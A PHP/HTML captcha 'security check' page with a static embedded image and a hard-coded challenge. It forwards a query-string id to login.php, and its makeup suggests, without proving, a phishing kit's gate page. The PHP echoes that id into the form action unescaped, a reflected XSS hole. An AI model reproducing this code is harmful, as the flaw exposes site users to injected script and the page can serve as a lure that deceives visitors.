<?php
       $query_string = $_SERVER['QUERY_STRING'];
          parse_str($query_string,$myid);
          $userId = $myid['id'];
          ?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Almost there</title>

    <style>
      * {
        box-sizing: border-box;
      }

      html {
        /* Change this variable to change site brand */
        --brand-color: #8830fa;
        border-top: 14px solid #8830fa;
        border-top: 14px solid var(--brand-color);
      }

      body {
        color: #212121;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji",
          "Segoe UI Emoji", "Segoe UI Symbol";
      }

      .container {
        width: 100%;
        max-width: 500px;
        margin: auto;
      }

      .centered {
        text-align: center;
      }

      .header {
        margin-top: 4rem;
      }

      .header h1 {
        color: #8830fa;
        color: var(--brand-color);
      }

      .main-area {
        position: relative;
      }

      .captcha-form {
        border: 8px solid #f5f5f5;
        border-radius: 8px;
        padding: 1rem;
      }
      .captcha {
        display: block;
        width: 100%;
        margin-bottom: 1rem;
      }

      .captcha-form label {
        margin: 1rem 0;
        font-weight: bold;
      }

      .captcha-form input[type="text"] {
        display: block;
        margin: 0.5rem 0;
        font-size: 18px;
        box-shadow: inset 2px 0px 5px rgba(0, 0, 0, 0.075);
        border: 1px solid #c2c2c2;
        padding: 0.5rem;
        border-radius: 8px;
        width: 100%;
      }
      .captcha-form input[type="text"]:focus {
        border-color: #8830fa;
        border-color: var(--brand-color);
        outline: none;
      }

      .captcha-form button {
        display: block;
        width: 100%;
        color: white;
        background: #8830fa;
        background: var(--brand-color);
        border: 2px solid #e0e0e0;
        border-radius: 8px;
        margin: 1rem 0;
        padding: 0.5rem;
        font-weight: bold;
        font-size: 18px;
        cursor: pointer;
      }

      .captcha-form button:hover {
        background: #3730fa;
      }

      .captcha-form button svg {
        width: 1rem;
      }

      .faq {
        width: 100%;
        background: #f5f5f5;
        padding: 1rem;
        margin: 2rem 0;
      }

      .faq h3 {
        margin: 0;
      }

      .note {
        font-style: italic;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
        color: #8830fa;
        color: var(--brand-color);
      }

      .notice {
        margin: 1rem 0;
        padding: 0.5rem;
        background: #fbeae6;
      }

      .notice p {
        margin: 0;
      }

      @media screen and (min-width: 768px) {
        .container {
          width: 380px;
        }

        .faq {
          position: absolute;
          top: 2rem;
          left: 100%;
          width: 180px;
          border-radius: 0 4px 4px 0;
        }
      }

      @media screen and (min-width: 1024px) {
        .container {
          width: 500px;
        }

        .faq {
          width: 240px;
        }
      }
    </style>
  </head>
  <body>
    <main>
      <header class="header container centered">
        <h1>You're almost there!</h1>
        <h2>We require a security check.</h2>
      </header>

      <div class="main-area container">
        <form class="captcha-form" method="post" action="./login.php<?php echo '?id='. $userId ?>">
          <img
            class="captcha"
            alt="Human readable captcha, if you use a screen reader - please contact us."
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANwAAAB4CAAAAAC8vMOlAAAS40lEQVR4nOVceexfRRGfef1RwFKUFsQKVOSoAhWEShTBA+uFV4iiIkaUKCrBk1ijEjUkokYUr6JUxIPggVUT7yhVg4harTVaQGwByxGxtMUCBVoKjO&#x2f;tOde+X+t&#x2f;&#x2f;njQt+&#x2f;t252d3Z2dz8zsfn8dEdBwAQHUJObod6j56Q3K+3amYPIFfSDVvmmXpTDaXv+5A+z&#x2f;6y8K&#x2f;wOFF35RTFA+xmdMOZnI2IWcGpTyhUT4SPwdTSWvlVbDfaWOEw95pIuUB9R5Ay+6eb9ZFJ0YvhAjhs2x1GMh2iHUWZhLxuIdWfpszEQeYS2IeiyoVpODEDlAIRJUSib+FFUzWuhOnjukVIeu04xwGVWVotwqutgsomu7OZKcHmZki0Yw37hIlui8DojaLVJcUND5xucvChlimVtq8oeaXdsZEqWx0UmMnZNrA7jco8ty4c+uwrF3KgqDZEcEA0ZrwchIkNQ2OMLDVLu6Jv6MpDCOPzWFFi79z&#x2f;gI4PID5PQDJrxJRLOwDT5gS3PUOn0ZKlUxsMAp+JXIaS5UaHxBJbn8O3WFFVBNExPilq5Dt1O5BLGqRK3yslLAzQQbaMebbCtgoa7gXIKbBmT4fcBaIANUE6FUeTebjzylPqCPRuIROWI7Omgi2lzV&#x2f;ohDRC2ifiMFyn3hIaYExQxgGxMJRlnIg48NWQ&#x2f;5E6H7YW2goMzMxkkv4r3yhhzLHAtRBWLfBWfojpZMavPIR451tEuWuLXxWhjW7B8w+0RDsWtWVFkmUkJKlm7mUQ6EmGU+H7gdk&#x2f;J&#x2f;fXWkUEviC0g8g0lxyHyH0Xrbh3fQzocxP7DL80iuNUTChRgxCUkZa9JdM+jE6LvtypLU+E5cYKmIYqHX1TZKTwygkzLy0BNo4j1EvQwqewgamNyyTYSV30uhQJYy9diPTnGY+i5gy44YcZhJj8JX0mONhTxq3aI1WSrOncdS0sgUqvFC4kU7O&#x2f;6B+0oamy4G1Z5TVYiOGGPRvZRbRlD9NlwQWDuIGAcIRaYMaiU46kBaLPxJCmseenJG2BlZkKEEqdu1uzQON2Lhk4IH3iJxzIBofpGSH9MctYwrPbrEJoesVIqaOpAAltn64Kql+E30O+dNdZCDgnPb619FXWL9Mxe3ajmOc3HWKq7CCD6O4R5MXj8pFO1KjAQD5QuyGqjiWOQ8AZTecWtzkpZAslddsjb2ZoUirDxwTV&#x2f;t7rHyAkYrqpZOksQx9OnUT6PLhSpWYl3i6DGK2Z8jMyOqb8wlQh3C9Fnitq6ilGugOz9O6+53Z&#x2f;wVQeyoMbMK0QS3QuFmSWmpOxQzxp0SUiNNYIG71DH6XBcgVjCWCWuOGhRr4yi6oZnElnEqnTf3qqaMBO52QS3cXlQzLYoQIMpiiS3PPt9rtIeLF6kwzeiqkU5wNsa0dyoDAtoJZdoEiVomzhS&#x2f;uuwXATTxbMyPI8fvSs7V2H4ajOKYSZvxzxbexnQiTSLJGFhdLUg1ptHCFCTgkW0CPzjCH2UcypG&#x2f;IraxeFpGgRNSjDR56xSPhaysTUZxa3+KqU4OZcpHq&#x2f;gorAUyupTr3xjepcKJ2eszfUsaM3gFDmlgm0dYoFibsgaFSdJpeAlMORpdKpuI9FB2WttJHByEAd9BjT1pV6fCpRkpKb&#x2f;ui50JNXZgZATRp0zju9LNVvheAY&#x2f;&#x2f;ebFZBxGxiSHqSssy7bAOo78R3rsK9rp3y85w2H7zjz6ZYCREQ0JIHQYE26Ucy5BpWLou2rgpK1zzEyWQIzDkbvvukisf4kx2zzjj5O1phwVsTRo0TfxP93sKXt0O+FHMLwONQzBZ&#x2f;JKlW96UW8&#x2f;tbYTdhte3bAUycUmY3L9rpTpANDaXTGMyxb8W8G0QlAFiuIV0sQiMYfoUFcOLv9zfFqwuhi7CbFj9vP5xyYs3p&#x2f;rFPqZNAB&#x2f;73GVXC01bUl&#x2f;NlNwJ2A7hrPYeRqCBdX9avx6+AMueuC&#x2f;uHbhY+Ymrry7lZx188IKq9fCU61bGxzmHBwj+Zf945OV7sGhL&#x2f;&#x2f;TDXfuXZSf&#x2f;ILw&#x2f;O0Xttlx68XKAD&#x2f;RfDjz93TnAizmNlbEaEaVFpRjDY1zyYws2pFsWX&#x2f;rXTGq3zf3tzMUhf+UL1oe8DbNFc0MTa5+6LuT316fe09&#x2f;2XvXoqHspeYe9sA69g3M+NOR989s&#x2f;Gl4W3HNdHeF5qyU&#x2f;cleMwWhVKE1tqbUT01Jxyufc8oR777wrPIfO9Y1d8vrwuvLIomXzv8Vvz8zd&#x2f;MT7+vslr&#x2f;MGr7922haZfPCYPw2vhxz1uJnvh6PizK+arwdtkrSr7KYs5sZHsZEpXDrc9vnKHTfDdbfcueE3VRgATn1OeDqDZG2EjR8G+Gykee7QtwNOaa2ZbamhadP729ybrr303PcB&#x2f;fmPhw55L9&#x2f;ixaHB5BTI77TNWAwoZbbk9IpTh&#x2f;vfTpsZ6s0+Uny9cOfhvvwiUiQ&#x2f;eAe87IXhCb8+5Jw2TTiV6VoaKK2pBGfOTQ9H&#x2f;2Zef1&#x2f;zEay1XM+8hL9h6l&#x2f;dqL8EAl+Gt08Olc6veHL38H5m9dPi9YZYPuPY8QAfTOVPGD4&#x2f;pnGe5Pjh4yHx&#x2f;VgAAOb&#x2f;PR9yBsc9P96aOedbWPkK2oAF5rnX8KX+3y5vrhI7U44VXRGSr&#x2f;827SjF+r+Gue+L3x+4crgv4L4Qk8wFw+3vNeew6pvgSUNykmQSwI0xRLbRnP2qnkHE6xjHq31f3kMvHD+jbkTdreg+87RQ+4xtLG&#x2f;&#x2f;fq4fER9XD8gB81mYkF&#x2f;zM2&#x2f;I9i5TL5473FfqbvguaJ6YGv3isa3iBpOK+vwhdKCEjU1biF&#x2f;da3i4+jMsdy0sfEV6jEC&#x2f;f&#x2f;biSEbNDgA+tAD84+N26W833mmDmKkn2nmuQVluTuV4g8qMLwF85lU1qoae8qqEc25lanbic9lfvjkkc2oF4R0+E5wrfez2H+7rmlFNz5fsCFRQM82JPWU13K4fbgealhliUIAK2PzO&#x2f;OU1AO84NAvXopDMqkT5AOIG1txVeZxzRjCt7ySXLbX28kun8sp8lFY5imMQy9115y9gLltfYxAg+P5P45q66luw94dLyTdVPgvRKhx7GvaY7K8YbnWJy9iIEzGa6le3Y+dDwthuIINzOU4Z&#x2f;m09JA1gf13Upw9VvDolfLiW0+X+GpZ6YfAP4+WePOSsavIHGq&#x2f;BHkmUFqXYEBpuAdY22zEifnJs+oXxpTek7jp7MPCqmATzDA4VVes22wMsAnJsSjEf4g7D+MjETN4zkXs1OjQoTqdjW1xT3dC5u5oF0ihEsIMze6V5O5zOS80I9+UgBi3rNNzJkktz0rsJQdHuIz+CA3Osv+UEEcop4qPK6g2eKdwA1jIXu5dwXgC7yy&#x2f;7x&#x2f;mwx7m8VKgP&#x2f;+EtsE7ebBks102DWfCsru5QIZtZYtyz6SnmVx4+kqOQAwsJjw4fkr+DN3G83qxPheSsfu4+MpvxS&#x2f;uG5&#x2f;XWbgosbRBvifWY4G+Hh2NMXDOtTpKbRqJzuhlCjgdUxyOs6ssB3O6VPgC8buFw&#x2f;9cv4Yi31M84WMVhFhxBGVpca2jWHZrXB7IlcKsNkmJ2kO2cs4OnVl8ssbB3xODKdZOszb7wF3eJ74un1er9t&#x2f;nh9fpqYHH3kdb4zAzXuoHesYcWo1cvtjABCA+jq2P7ahLXoOIG+&#x2f;6TodK0H7f8uQJcsCmQX0oqnnlOqL+JXBydO3w8rfpzhxU8u3j48i7icVEw+4Ia&#x2f;6JYOjKGRcOkJE35i17e3x58JT6YygVj8wK7BmiapJebeO1we3BZakPq5muCtnxNzbnm37HajWe8cUjOE6ySJO6cO6AJ3alkNhKo8&#x2f;j5+cLVvdtyH+zzksfDJ2+&#x2f;8c9rw8yNbAAq4gc+&#x2f;xf9wzdewf2pHID7xnA74nmssTkz5u42Aw6+oX+fftbHJ&#x2f;hIqA054SRRLTO6sQE5qFc05sY9OdVXr7ghhvZK6C8t9s0B75eeBGpf9vdPH+43HAB2Y2PPAQoue1Vs6bjeLdhlWxaQ2RvXHITpBD8qY5kffCQwoT3myTmTHqexDM1suCzr2OknXfHtIVJ3ATCPl8DXdyn7mDcMT+8vDbKGAsy9irmqW+5d9b2Lzgf41vLb6aDACGnXjTNeDZYE8BOVfQDjx9XTvPyXi6+m9b9ft2GnRVct2DkA8iCWqRBJGalyEH&#x2f;7M9w&#x2f;&#x2f;bX+6TtfYmMYW&#x2f;n5cNv7L3wwnj59fh95OEtFeJBvwqWpskEgyGsuLzJoO0ay9l4v62+LBgF7aJucYQIz68qq2CM8vXXnUyXtZSf2t1mXP5ZXvhfAm36qcWeyvNleTM2rU7gxyfkRlQ8uzlEBQABy9u1gYwzRnfmz+8L7NlgUoyqbmD8WcS7HN+s&#x2f;Ee8E49cBj8NW21Ipc4ZAQkXkfBQxAPbNuTSqzFq67Lg+veCE3fc7auHRfdThvNsAngP0KDJk0vIlL1KOxY2sB3+rcYblvKXoYX5CkB2sD6R&#x2f;WSRqM+aWcpZY&#x2f;sIr&#x2f;3o2TINtt&#x2f;7lVytga8h6I7MZmg4Vao1OVUAUGxR&#x2f;hSXmRhwi0z4QUuuHdvxA2mRGddQHh5979zU33XbP1omz59yWOlc6QsUTLyZ31SFoIY6pF87gRD29w2SQZC9QBP3q4Jofr1UQ2HhtSNbc+ljzy4USqtz1KU8ZHs&#x2f;+&#x2f;rOHudsCt+5bOaXjZHkA7qoQ5qM1+QiI4CNvo3Z8gOww50kHfSGpKWL1F514xO57xgDrB&#x2f;bbFeGt&#x2f;2ySDrWetiS+vGiTbdptgK0LCT3FDY0clz1xNtF1JIoRhlksivSl&#x2f;LsFx1G8P7+VsXF&#x2f;v49&#x2f;8uPl4Rcz36s&#x2f;OqSrTvj57rHOxStWXNOn1x4w7+B5L02M1Blsib4Y8CkPdd2OnOvQOPLaSudjTXwE99wkSD&#x2f;s&#x2f;pdEMrOXbPH8SqqnUnYkzup7BeZYVA5RFFXj1UsLXFjtuhx&#x2f;5+XuP&#x2f;2SmDvzSb9buOQg4u1a&#x2f;rYzRRLMS+bYevOJsFML9syVd6QCS7DJnOGye1CVXrAn0T+LVs6XYFWe6XuXh7yQ1G04Wzkl1sug3VjMjAjHXdJEWbmFc3aaMe9E+N1DUOAufSNmJ3s6KT6ZX8P5zqo+JEPgi6tIx8QRlDPJDriX&#x2f;IKxDj05k3bmKt91JqnTG1tYpqXmsfi1uhy9bj+iYxhKc4k8ciYXeQPo8kHM+Eqbj5wcpab9WEUlJQMyxoXnhps2sB1LtpZzisqhJe8rATysgpaQ&#x2f;sCSwQ3fDxP7XwBj+3ijKdR4I1Bx2eK8pT2dVj0Acvbham0SfmnnqjhiajBcSfjY7FMx0UcudFPii5D5hcV8aggZMfeO57IjMyDuE4BjZhiSVgt564icKKjHTkmZYtJWvHkkpSjHho8TU+W7pq5CyNsmmMaFGBBU&#x2f;7NhEstcnIxPBO3ty+66VCFPZfIGVBvYOeNc3ljAr4QXCBzdWF9MOCJrM2MhSEZJvyCMKkDmI6Q5YNs8WUvroxoNGsRdGssd2rEm8Sa+8j05XopYL6sbhn5HlXFUPTtWsD1zqQ3TF3J4Jsa1QwSYYYCsE8R7Cmr9IQhNQdq4GLno4QB6HTTwCFTK86Fg4SiOgcHJjFPSXzPlgEb8SV4eKl1w6nejSkwquaKQSDkK3uY9VMljBMjqVuZQoCKg8BFBrjDGHInzm1RmzvSHJSTEVzJq4dSScXrNgrqmUQJnJG1bZOiJ8asE0+l0PjRpKECZrZmejATmRnxl5nQ9GzZCB2ljmGnLyVQDua+Ru&#x2f;izTjY0SM2KsVFyelc63fLamyyRHXWWj1lmS&#x2f;QtO6GlgtNCiY7VM84oZqE1YCL+zIQYi68keFYQYdeQ6JpdfMintsxAlhSihnCk+mojpKxHAqd9Xgwl4unlYusIp9cVeIc9yh3xzQFoTsHUB7puPP6n&#x2f;CcZNwS3HhicAouXBu9gzO9TuNjCV84klf05dJVxeNdK2EKDoycdDVb3Y7yGRv6gILAVih6LI211CG7svSmzKH8aK389jU0CZSBKnEvu&#x2f;k3mFVbFWLYbfY4ZhscwwwhlDyONBYJifOvHFjGp+4SX44G7VCjpD2sRuUPAI7xYj0f5YTWl+pVwqcLoOb4c7LUwOoFDsgU0L+SetOfGWfrBtoECVQul6h8pzPBHGEH+eFhCnjdJUuCr20OZp0pDQkkEcc&#x2f;Gk&#x2f;yWdqyMMlFsNmS7YVo0PPj+vJgbxdPUxzV9dQ6eWHwBYidAJK5AC+9oPK4JOx7v5MzUqGemBIav&#x2f;DeIxGVtdICRNVwzkZdiawPA7D4IT2IHRKv8DQ1idqLSREVku6aZzFkg1Yu0tPVZL46X&#x2f;MgH6uXucjyJ6tF029hYcQ5o1D5AE7URI0X+oKMyX9S8KRUPLUe82Tes8WHbchWrCQCne8xYQpLnbhgZNmtKMArapKOIah4JrP2V9aA+AYv+wEuRQS48fOZCFrVQWZx+QB2dNeOqqFAO0ZmoSB3i5JkxJEdJwhn1uuGINIKg&#x2f;Lc81WZsCAiV1nyhc3a31UIUfx4aXZPETqrorCyRfhjqgPCUv&#x2f;4LSDGwUG5tBSMAAAAASUVORK5CYII="
          />

          <label for="response">
            Enter above text:
            <input
              type="text"
              name="response"
              value=""
              autofocus
              autocorrect="off"
              autocapitalize="off"
              spellcheck="false"
            />
          </label>
          <input type="hidden" name="return_url" value="&#x2f;log_in" />
          <input
            type="hidden"
            name="challenge"
            value="bWUSQcYQKrJ1YvInyOe7+ojnO8ItwM+j:nyyMJ9GyAPTmSN4uo5I4LHUDu+s&#x2f;sMp2+b4hGidSxOQuCxOL276SzMYzWPQCMj+x8zs5uHPA5ybbFyOsgBykBAk5FAR1BQHuU9ECTVQKFc3tmYHPDBcnSQRmZwPh1le28f5&#x2f;+HJe9WzqYmtC53YGtXtS7JIB"
          />
          <button>
            <svg
              aria-hidden="true"
              focusable="false"
              data-prefix="fas"
              data-icon="unlock"
              class="svg-inline--fa fa-unlock fa-w-14"
              role="img"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 448 512"
            >
              <path
                fill="currentColor"
                d="M400 256H152V152.9c0-39.6 31.7-72.5 71.3-72.9 40-.4 72.7 32.1 72.7 72v16c0 13.3 10.7 24 24 24h32c13.3 0 24-10.7 24-24v-16C376 68 307.5-.3 223.5 0 139.5.3 72 69.5 72 153.5V256H48c-26.5 0-48 21.5-48 48v160c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V304c0-26.5-21.5-48-48-48z"
              ></path>
            </svg>
            Unlock
          </button>
        </form>
        <aside class="faq">
          <h3>Why do I have to do this?</h3>
          <p>
            Completing the captcha proves to us that you're a human. We don't
            want unauthorised bots visiting our website.
          </p>
        </aside>
      </div>
      <p class="container note">
        Security checks help us keep our services fast and safe.
      </p>
    </main>
  </body>
</html>
